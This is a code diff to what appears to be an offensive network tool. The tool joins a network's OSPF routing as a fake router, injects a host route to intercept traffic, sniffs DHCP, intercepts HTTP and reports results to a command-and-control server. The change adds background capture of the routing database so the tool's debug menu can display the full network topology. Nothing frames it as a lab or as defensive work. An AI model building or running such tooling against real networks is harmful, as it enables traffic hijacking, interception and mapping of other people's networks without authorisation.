@@ -156,25 +156,37 @@ def _init_c2(args) -> dict | None:
 
 # ── Debug menu ────────────────────────────────────────────────────────────────
 
-def _show_ospf_networks(ospf_hellos: list) -> None:
+def _show_ospf_networks(ospf_hellos: list, lsdb_subnets: list | None = None) -> None:
     import ipaddress as _ip
+
+    # ── LSDB-derived subnets (full topology from LS Update packets) ───────────
+    if lsdb_subnets:
+        print(f"  OSPF LSDB — {len(lsdb_subnets)} network(s) learned from LS Updates:")
+        print(f"  {'Prefix':<22} {'Advertised by':<16} {'Type':<14} {'Metric'}")
+        print(f"  {'─'*22} {'─'*16} {'─'*14} {'─'*6}")
+        for s in sorted(lsdb_subnets, key=lambda x: x["prefix"]):
+            print(f"  {s['prefix']:<22} {s['adv_router']:<16} {s['lsa_type']:<14} {s['metric']}")
+        print()
+    elif lsdb_subnets is not None:
+        print("  LSDB capture still running — check back in a moment, or use option 5")
+        print("  in the OSPF adjacency terminal for the live LSDB view.")
+        print()
+
+    # ── Hello-learned SVIs (directly adjacent routers) ────────────────────────
     _auth = {0: "none", 1: "simple-pw", 2: "MD5"}
-    if not ospf_hellos:
+    if ospf_hellos:
+        print(f"  Adjacent SVIs ({len(ospf_hellos)} Hello source(s)):")
+        for p in ospf_hellos:
+            try:
+                subnet = _ip.IPv4Network(f"{p['src_ip']}/{p['netmask']}", strict=False)
+            except Exception:
+                subnet = f"{p['src_ip']}/{p['netmask']}"
+            print(f"    rid={p['router_id']}  ip={p['src_ip']}  subnet={subnet}"
+                  f"  area={p['area_id']}  auth={_auth.get(p['auth_type'], '?')}"
+                  f"  hello={p['hello_interval']}s  dead={p['dead_interval']}s")
+        print()
+    else:
         print("  (no OSPF Hellos captured)")
-        return
-    for p in ospf_hellos:
-        try:
-            subnet = _ip.IPv4Network(f"{p['src_ip']}/{p['netmask']}", strict=False)
-        except Exception:
-            subnet = f"{p['src_ip']}/{p['netmask']}"
-        print(f"  Router ID : {p['router_id']}")
-        print(f"  Gateway   : {p['src_ip']}")
-        print(f"  Subnet    : {subnet}")
-        print(f"  Area      : {p['area_id']}")
-        print(f"  Timers    : hello={p['hello_interval']}s  dead={p['dead_interval']}s")
-        print(f"  Options   : 0x{p['options']:02x}  (area={'normal' if p['options'] & 0x02 else 'stub'})")
-        print(f"  Auth      : {_auth.get(p['auth_type'], p['auth_type'])}")
-        print(f"  DR / BDR  : {p['dr']} / {p['bdr']}")
         print()
 
 
@@ -260,7 +272,8 @@ def _transmit_to_c2(c2_config: dict) -> None:
 
 
 def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
-               c2_config: dict | None = None, ospf_hellos: list | None = None) -> None:
+               c2_config: dict | None = None, ospf_hellos: list | None = None,
+               lsdb_subnets: list | None = None) -> None:
     """
     Interactive debug console.  Runs in a daemon thread while the DHCP sniff
     loop blocks the main thread.
@@ -293,7 +306,7 @@ def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
             break
 
         if choice == "1":
-            _show_ospf_networks(ospf_hellos or [])
+            _show_ospf_networks(ospf_hellos or [], lsdb_subnets)
         elif choice == "2":
             _show_leases(networks)
         elif choice == "3":
@@ -381,7 +394,19 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None):
     route_ip = dhcp_server_ip or our_ip
     print_step("OK", f"OSPF /32 injection target: {route_ip}")
 
-    # ── Step 5: OSPF adjacency ────────────────────────────────────────────────
+    # ── Step 5: OSPF adjacency + background LSDB capture ────────────────────
+    # Start the LSDB sniffer BEFORE launching the adjacency engine so it is
+    # already listening when the EXCHANGE-phase LS Updates flood the wire.
+    lsdb_subnets = []
+    lsdb_thread = threading.Thread(
+        target=ospf_adjacency.sniff_ospf_lsdb_subnets,
+        args=(interface, lsdb_subnets),
+        kwargs={"timeout": 120},
+        daemon=True,
+        name="lsdb-sniffer",
+    )
+    lsdb_thread.start()
+
     ospf_adjacency.launch_in_terminal(
         interface,
         auto_route_ip=route_ip,
@@ -390,7 +415,7 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None):
         dead_interval=ospf_params["dead_interval"],
     )
     ospf_adjacency.wait_for_adjacency_exchange(interface, our_ip)
-    return interface, our_ip, offer, dhcp_server_ip
+    return interface, our_ip, offer, dhcp_server_ip, lsdb_subnets
 
 
 def start_http_intercept(sniff_iface):
@@ -432,7 +457,7 @@ def main():
     loopback_alias_ip = None
     try:
         # ── Phase 2+3: configure IP, untagged discover, OSPF adjacency ───────
-        ospf_interface, our_ip, offer, loopback_alias_ip = setup_and_form_adjacency(
+        ospf_interface, our_ip, offer, loopback_alias_ip, lsdb_subnets = setup_and_form_adjacency(
             interface, ospf_params, target_ip=args.target
         )
         ospf_iface_for_fwd = ospf_interface
@@ -457,7 +482,7 @@ def main():
         # ── Debug console — runs in background while Phase 7 blocks ──────────
         debug_thread = threading.Thread(
             target=debug_menu,
-            args=(networks, proposed_leases, server_details, c2_config, ospf_hellos),
+            args=(networks, proposed_leases, server_details, c2_config, ospf_hellos, lsdb_subnets),
             daemon=True,
             name="debug-menu",
         )
